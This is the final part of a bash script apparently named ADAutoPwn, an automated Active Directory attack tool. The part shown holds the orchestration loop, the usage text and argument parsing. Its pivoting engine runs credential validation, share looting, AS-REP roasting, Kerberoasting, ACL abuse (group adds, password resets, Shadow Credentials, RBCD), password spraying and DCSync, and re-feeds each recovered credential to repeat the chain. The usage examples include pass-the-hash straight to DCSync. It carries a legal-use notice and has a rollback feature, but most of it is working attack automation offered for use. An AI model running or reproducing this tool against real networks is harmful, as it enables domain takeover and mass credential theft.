            sort -u "$OUTDIR/valid_creds_map.txt" | while IFS= read -r l; do echo -e "      ${C_GREEN}$l${C_RESET}"; done
        fi
        if [[ -s "$OUTDIR/credential_map.txt" ]]; then
            echo -e "    ${C_BOLD}Recovered passwords:${C_RESET}"
            sort -u "$OUTDIR/credential_map.txt" | while IFS= read -r l; do echo -e "      ${C_MAGENTA}$l${C_RESET}"; done
        fi
        ok "Full map saved → credential_map.txt / valid_creds_map.txt"
    fi
    echo
    ok "Done. Full log: $LOGFILE"
    echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
    echo -e "${C_GREY}     Thanks for using ADAutoPwn · by ${C_RESET}${C_GREEN}${C_BOLD}${AUTHOR}${C_RESET}"
    echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
}

_atexit() { [[ -n "$SUDO_KEEPALIVE_PID" ]] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null; }
trap _atexit EXIT INT TERM

# ===========================================================================
#  PIVOTING ENGINE  —  assess each credential, recurse on what it unlocks
# ===========================================================================
BH_DONE=0

assess_current_credential() {
    SEEN_CREDS["${USER,,}"]=1
    HAVE_AUTH=0; KERB_TICKET=""; unset KRB5CCNAME

    section "ASSESSING IDENTITY · ${USER}"
    info "Credential: ${C_BOLD}${USER}${C_RESET} $( [[ -n "$HASH" ]] && echo '(NT hash / PtH)' || echo '(password)')"

    phase_validate_creds
    [[ "$HAVE_AUTH" != "1" ]] && { warn "Skipping further phases for $USER (no valid auth)"; return; }

    phase_auth_enum;    jitter
    phase_user_variants; jitter
    phase_share_loot;   jitter
    phase_secrets;      jitter
    phase_winrm_dpapi;  jitter
    phase_acl;          jitter
    phase_recycle_disabled; jitter
    phase_relay;        jitter
    phase_trusts;       jitter
    phase_asreproast;   jitter
    phase_kerberoast;   jitter
    phase_adcs;         jitter
    if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
    phase_dcsync;       jitter
    # Spray everything we recovered this round across all users → new pivots
    phase_password_spray
}

process_queue() {
    local entry u p h
    while [[ ${#CRED_QUEUE[@]} -gt 0 ]]; do
        entry="${CRED_QUEUE[0]}"
        CRED_QUEUE=("${CRED_QUEUE[@]:1}")        # dequeue (FIFO)
        IFS='|' read -r u p h <<<"$entry"
        [[ -n "${SEEN_CREDS[${u,,}]:-}" ]] && continue
        USER="$u"; PASS="$p"; HASH="$h"
        assess_current_credential
    done
}

# ===========================================================================
#  USAGE
# ===========================================================================
usage() {
    banner
cat <<EOF

${C_CYAN}${C_BOLD}USAGE${C_RESET}
  $0 -t <DC_IP> [-d <domain>] [-u <user>] [-p <pass> | -H <nt_hash>] [options]

${C_CYAN}${C_BOLD}REQUIRED${C_RESET}
  ${C_GREEN}-t${C_RESET} <ip>        Domain Controller IP address

${C_CYAN}${C_BOLD}CREDENTIALS${C_RESET} ${C_DIM}(optional — without any, every unauthenticated phase still runs)${C_RESET}
  ${C_GREEN}-d${C_RESET} <domain>    Domain FQDN (e.g. corp.local). Auto-detected via SMB if omitted
  ${C_GREEN}-u${C_RESET} <user>      Domain username
  ${C_GREEN}-p${C_RESET} <pass>      Cleartext password
  ${C_GREEN}-H${C_RESET} <hash>      NT hash for pass-the-hash (LM:NT or just NT)

${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
  ${C_GREEN}-o${C_RESET} <dir>       Output/loot directory          ${C_DIM}(default: ./loot_<domain>_<date>)${C_RESET}
  ${C_GREEN}-w${C_RESET} <wordlist>  Wordlist for cracking          ${C_DIM}(default: $WORDLIST)${C_RESET}
  ${C_GREEN}--sudo-pass${C_RESET} <p> Sudo password for unattended /etc/hosts + time sync
                ${C_DIM}(or export SUDO_PASS=…). Needed when running headless${C_RESET}
  ${C_GREEN}--creds-file${C_RESET} <f> Feed extra credentials to continue from (lines ${C_DIM}user:password${C_RESET}
                or ${C_DIM}user:nthash${C_RESET}). Each one is assessed and pivots recursively
  ${C_GREEN}--users-file${C_RESET} <f> Merge an external username list (for spray / AS-REP / variants)

  ${C_DIM}── toggles (no value) ──${C_RESET}
  ${C_GREEN}--no-crack${C_RESET}     Disable hash cracking ${C_DIM}(cracking is ON by default)${C_RESET}
  ${C_GREEN}--spray${C_RESET}        Also spray the domain-focused wordlist ONLINE ${C_YELLOW}(account-lockout risk)${C_RESET}
  ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
                WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
                accounts. Off by default → ACLs only reported. Rollback-tracked
  ${C_GREEN}--cleanup${C_RESET}      Revert every change this tool recorded, then exit. Point ${C_GREEN}-o${C_RESET} at the
                original loot dir so it can read its rollback.log
  ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
  ${C_GREEN}--ntlm${C_RESET}         Force NTLM auth ${C_DIM}(default is Kerberos-first)${C_RESET}
  ${C_GREEN}--no-bh${C_RESET}        Skip BloodHound collection
  ${C_GREEN}-y, --yes${C_RESET}      Assume "yes" to all prompts — fully unattended run
  ${C_GREEN}--no-color${C_RESET}     Disable colored output (also honored via NO_COLOR=1)
  ${C_GREEN}-h, --help${C_RESET}     Show this help

${C_CYAN}${C_BOLD}WHAT IT DOES${C_RESET} ${C_DIM}(phases run automatically, gated by what your access unlocks)${C_RESET}
  ${C_PURPLE}0${C_RESET}  Discovery      nmap of AD ports, SMB fingerprint → hostname/domain/FQDN
  ${C_PURPLE}1${C_RESET}  Host & time    auto /etc/hosts entry + clock sync with DC (Kerberos prereq)
  ${C_PURPLE}2${C_RESET}  Unauth enum    null/guest sessions, anon shares, RID brute, rpcclient,
                    LDAP anon bind, enum4linux-ng, kerbrute userenum
  ${C_PURPLE}3${C_RESET}  AS-REP roast   GetNPUsers against discovered users (no creds needed)
  ${C_PURPLE}4${C_RESET}  Validate+TGT   verify creds, request & cache a Kerberos TGT (reused after)
  ${C_PURPLE}5${C_RESET}  Auth enum      users, groups, pass policy, descriptions, shares, MAQ
  ${C_PURPLE}+${C_RESET}  Secrets        LAPS & gMSA reads (auto-pivot on recovered hashes)
  ${C_PURPLE}+${C_RESET}  ACL analysis   exploitable rights (GenericAll/WriteDACL/ForceChangePwd/…),
                    optional abuse with --abuse
  ${C_PURPLE}+${C_RESET}  Trusts         domain/forest trusts, foreign principals, cross-forest roast
  ${C_PURPLE}6${C_RESET}  Kerberoast     GetUserSPNs for SPN accounts (+ cross-forest)
  ${C_PURPLE}7${C_RESET}  ADCS           certipy scan for ESC1..ESC16 vulnerable templates
  ${C_PURPLE}8${C_RESET}  BloodHound     full collection (All) → importable .zip
  ${C_PURPLE}9${C_RESET}  DCSync         secretsdump -just-dc when privileges allow → all NTLM hashes
  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA) is
                    re-fed and the whole chain repeats until nothing new appears

${C_CYAN}${C_BOLD}EXAMPLES${C_RESET}
  ${C_DIM}# Zero-credential recon (users, AS-REP, anon shares, trusts)${C_RESET}
  $0 -t 10.10.10.10

  ${C_DIM}# Full authenticated, auto-cracking, fully unattended (Kerberos default)${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --crack -y

  ${C_DIM}# Go loud: also abuse ACLs (add to groups / reset passwords) with rollback${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --crack --abuse

  ${C_DIM}# Pass-the-hash straight through to DCSync${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0

  ${C_DIM}# Quiet engagement${C_RESET}
  $0 -t 10.10.10.10 -d corp.local -u jdoe -p 'P@ssw0rd' --stealth

  ${C_DIM}# Clean up after yourself (revert group adds, etc.)${C_RESET}
  $0 -t 10.10.10.10 --cleanup -o loot_corp.local_20260607_2210

${C_CYAN}${C_BOLD}LOOT LAYOUT${C_RESET} ${C_DIM}(everything is also printed live)${C_RESET}
  loot_<dom>_<date>/  adautopwn.log · nmap_dc.txt · users_all.txt · asrep_hashes.txt
                      kerberoast_hashes.txt · secretsdump.txt · laps.txt · gmsa.txt
                      acl_writable_<user>.txt · trusts.txt · certipy_find.txt
                      bloodhound/*.zip · cracked_passwords.txt · rollback.log

${C_YELLOW}${C_BOLD}⚠  LEGAL:${C_RESET} ${C_YELLOW}Use only against systems you are explicitly authorized to test
   (signed engagement, your own lab, or a CTF you're entitled to play).${C_RESET}
EOF
}

# ===========================================================================
#  ARGUMENT PARSING
# ===========================================================================
parse_args() {
    [[ $# -eq 0 ]] && { usage; exit 0; }
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t) DC_IP="$2"; shift 2;;
            -d) DOMAIN="$2"; shift 2;;
            -u) USER="$2"; shift 2;;
            -p) PASS="$2"; shift 2;;
            -H) HASH="$2"; shift 2;;
            -o) OUTDIR="$2"; shift 2;;
            -w) WORDLIST="$2"; shift 2;;
            --sudo-pass) SUDO_PASS="$2"; shift 2;;
            --creds-file) CREDS_FILE="$2"; shift 2;;
            --users-file) USERS_FILE="$2"; shift 2;;
            --spray) SPRAY_GEN=1; shift;;
            --crack) DO_CRACK=1; shift;;
            --no-crack) DO_CRACK=0; shift;;
            --abuse) DO_ABUSE=1; shift;;
            --cleanup) DO_CLEANUP=1; shift;;
            --stealth) STEALTH=1; shift;;
            --ntlm) KERBEROS=0; shift;;
            --no-bh) DO_BLOODHOUND=0; shift;;
            -y|--yes) AUTO_YES=1; shift;;
            --no-color) NO_COLOR=1; shift;;
            -h|--help) usage; exit 0;;
            *) err "Unknown option: $1"; usage; exit 1;;
        esac
    done
    [[ -z "$DC_IP" ]] && { err "Missing -t <DC_IP>"; exit 1; }
}

# ===========================================================================
#  MAIN
# ===========================================================================
main() {
    parse_args "$@"
    clear 2>/dev/null
    banner

    [[ -z "$OUTDIR" ]] && OUTDIR="loot_${DOMAIN:-$DC_IP}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"
    LOGFILE="$OUTDIR/adautopwn.log"; : >"$LOGFILE"
    ROLLBACK_FILE="$OUTDIR/rollback.log"
    info "Loot and logs in: ${C_BOLD}$OUTDIR${C_RESET}"

    # Cleanup mode: revert tracked changes and exit
    if [[ "$DO_CLEANUP" == "1" ]]; then
        [[ ! -s "$ROLLBACK_FILE" ]] && warn "Tip: point -o at the original loot dir that holds rollback.log"
        run_cleanup
        exit 0
    fi

    check_deps
    request_sudo

    # --- One-time, unauthenticated groundwork ---
    phase_discovery
    gen_domain_wordlist          # build target-specific candidates once domain is known
    phase_hosts_time
    phase_unauth
    phase_asreproast

    # --- Self-feed: resume context + ingest anything the operator found manually ---
    # Resume recovered passwords if reusing an existing loot dir
    if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
        while IFS= read -r p; do [[ -n "$p" ]] && FOUND_SECRETS["$p"]=1; done <"$OUTDIR/found_passwords.txt"
        info "Resumed $(wc -l <"$OUTDIR/found_passwords.txt") previously recovered passwords"
    fi
    # Merge an externally-supplied user list (for spray / AS-REP)
    if [[ -n "$USERS_FILE" && -s "$USERS_FILE" ]]; then
        cat "$USERS_FILE" "$OUTDIR/users_all.txt" 2>/dev/null | sort -u >"$OUTDIR/users_all.txt.tmp"
        mv "$OUTDIR/users_all.txt.tmp" "$OUTDIR/users_all.txt"
        ok "Merged $(wc -l <"$USERS_FILE") external users → users_all.txt"
    fi

    # --- Seed the queue: supplied credential + any creds file, then pivot ---
    # Inline cracking/looting inside each phase feeds newly recovered creds back
    # into the queue, so process_queue keeps draining until nothing new appears.
    [[ -n "$USER" ]] && queue_cred "$USER" "$PASS" "$HASH"
    if [[ -n "$CREDS_FILE" && -s "$CREDS_FILE" ]]; then
        info "Ingesting credentials from $CREDS_FILE"
        while IFS= read -r line; do
            [[ -z "$line" || "$line" == \#* ]] && continue
            local cu cs; cu="${line%%:*}"; cs="${line#*:}"
            [[ "$cu" == "$cs" ]] && cs=""        # line had no ':' separator
            if [[ "$cs" =~ ^[a-fA-F0-9]{32}$ ]]; then queue_cred "$cu" "" "$cs"
            else queue_cred "$cu" "$cs" ""; [[ -n "$cs" ]] && add_secret "$cs"; fi
        done <"$CREDS_FILE"
    fi
    process_queue

    final_summary
}

main "$@"
